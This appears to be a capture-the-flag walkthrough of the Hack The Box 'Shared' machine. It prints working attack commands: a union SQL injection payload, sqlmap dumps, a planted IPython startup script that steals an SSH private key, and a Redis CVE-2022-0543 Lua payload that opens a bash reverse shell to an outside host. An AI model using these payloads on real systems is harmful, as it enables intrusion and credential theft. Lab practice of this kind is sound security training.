# [Shared](https://app.hackthebox.com/machines/shared)

```bash
nmap -p-  --min-rate 10000 10.10.11.172 -Pn 
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,80,443 10.10.11.172 -Pn
```

![alt text](img/image-1.png)

From nmap scan result, I need to add `shared.htb` domain into `/etc/hosts` file for resolving purposes.


While I open web application, I can see such webpage.

![alt text](img/image-2.png)

Let's start enumeration.


While I try to do `Proceed Checkout` action, it redirects me into `checkout.shared.htb` address, let's add this into `/etc/hosts` file also.

![alt text](img/image-3.png)

Now, I can see `checkout` webpage.

![alt text](img/image-4.png)


Let's look at this request via zaproxy to see full request body and headers.

![alt text](img/image-5.png)

I started to inject some payloads into `custom_cart` dictionary by starting `'` characters.

![alt text](img/image-6.png)


Let's inject `SQL Comment` to see that SQL injection is possible or not. So our payload `'-- -` should be like this.

![alt text](img/image-7.png)


As you it still prints the result, it means there'
s no Input Validation.

Let's try `Union-based SQLI` payloads.
```bash
custom_cart={"test' UNION SELECT 111,version(),3333-- -":"1"}
```

![alt text](img/image-8.png)

That's `MariaDB`. Let's automate `SQL Injection` via `sqlmap` tool by saving this request file as `.req`

```bash
sqlmap -r submit.req --level 5 --risk 3 --technique="U" 
```

![alt text](img/image-9.png)


Let's dump all databases via `--dbs` option.

![alt text](img/image-10.png)

Let's dump tables from `checkout` database via adding `-D checkout --tables` option.

![alt text](img/image-11.png)

Let's dump all data from `user` table located on `checkout` database. We do this `-D checkout -T user --dump` .

![alt text](img/image-12.png)


james_mason: fc895d4eddc2fc12f995e18c865cf273 (hash)


Let's crack this hash via [Crackstation](https://crackstation.net)

![alt text](img/image-13.png)


james_mason: Soleil101


Let's connect into machine via this credentials by using `ssh`.

![alt text](img/image-14.png)

Let's enumerate machine.


First of all, I want to upload `pspy64` into machine to see background jobs.


For this, I will open http.server as below.
```bash
python3 -m http.server --bind 10.10.14.18 8080
```

![alt text](img/image-16.png)


Then download this binary via `wget` command.
```bash
wget http://10.10.14.18:8080/pspy64
```

![alt text](img/image-15.png)



After running of this binary, I see that user whose userid is `1001` runs `ipython` in background.

![alt text](img/image-17.png)

That's `dan_smith` user.


![alt text](img/image-18.png)


Let's look at version of `ipython` to search publicly known exploits.

![alt text](img/image-19.png)


That's [CVE-2022-21699](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x)


Let's start exploiting this vulnerability. So my malicious `python` script is that stealing user's private key file by copying into `/tmp` directory.

```bash
mkdir -m 777 /opt/scripts_review/profile_default && mkdir -m 777 /opt/scripts_review/profile_default/startup && echo "import os; os.system('cat ~/.ssh/id_rsa > /tmp/dan.key')" > /opt/scripts_review/profile_default/startup/dr4ks.py
```

![alt text](img/image-20.png)

Now, let's join into machine via  private key file of `dan_smith` user.

```bash
chmod 600 id_rsa
ssh -i id_rsa dan_smith@shared.htb
```


user.txt

![alt text](img/image-21.png)


While I run `id` command, I see that this user belongs to `sysadmin` group.

![alt text](img/image-22.png)

Let's search files and directories belong to this group via `find` command.

```bash
find / -group sysadmin 2>/dev/null 
```

![alt text](img/image-23.png)


Let's download this into our machine and try to analyze this file

![alt text](img/image-24.png)


I downloaded it already.

![alt text](img/image-25.png)


While I run this binary on my box, it returns error as below.

![alt text](img/image-26.png)


To see target's `Redis` database, I will configure `Local Port Forwarding` via `ssh` command.

```bash
ssh -i id_rsa -L 6379:localhost:6379 dan_smith@shared.htb
```

![alt text](img/image-27.png)


Now, I can easily run this file and can get output.

![alt text](img/image-28.png)


As you see, here's say that `using password`. To  get clear-text password, I need to sniff, so I will use `Wireshark` to see clear-text password.

![alt text](img/image-29.png)


**Note:** I need to start sniffer for `Loopback`.

From `packet`, you see that `auth F2WHqJUz2WEz=Gqq` is written, it means our password is "F2WHqJUz2WEz=Gqq".


Let's connect into `Redis` via this password.

![alt text](img/image-30.png)


It says that `Redis's` version is `6.0.15`, I searched publicly known exploit and found [CVE-2022-0543](https://github.com/0x7eTeam/CVE-2022-0543/blob/main/CVE-2022-0543.py).


root.txt

![alt text](img/image-31.png)


We can get root shell by using below payload.
```bash
eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("bash -c \'bash -i >& /dev/tcp/10.10.14.18/1337 0>&1\'"); return 0' 0
```

![alt text](img/image-32.png)


Hola I got reverse shell from port `1337`.

![alt text](img/image-33.png)